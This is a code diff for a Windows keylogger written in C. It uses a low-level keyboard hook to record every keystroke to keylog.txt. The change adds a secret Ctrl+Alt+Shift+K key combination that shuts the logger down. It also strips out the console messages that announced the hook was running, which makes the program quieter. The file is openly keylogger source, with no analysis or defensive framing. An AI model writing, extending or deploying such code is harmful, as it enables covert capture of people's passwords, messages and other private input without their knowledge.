@@ -46,6 +46,15 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
         DWORD vkCode = kbd->vkCode;
 
+        if (wParam == WM_KEYDOWN && 
+            kbd->vkCode == 'K' && 
+            (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
+            (GetAsyncKeyState(VK_MENU) & 0x8000) &&
+            (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
+            StopKeyLogger();
+            exit(0);
+        }
+
         logFile = fopen("keylog.txt", "a+");
         if (logFile) {
             char ch = getCharFromVK(vkCode);
@@ -68,13 +77,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 void StartKeyLogger() {
-    MSG msg;
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
-    if (!hHook) {
-        printf("Failed to install hook!\n");
-        return;
-    }
-    printf("Keylogger started. Logging to keylog.txt\n");
+    if (!hHook) return;
+
+    MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
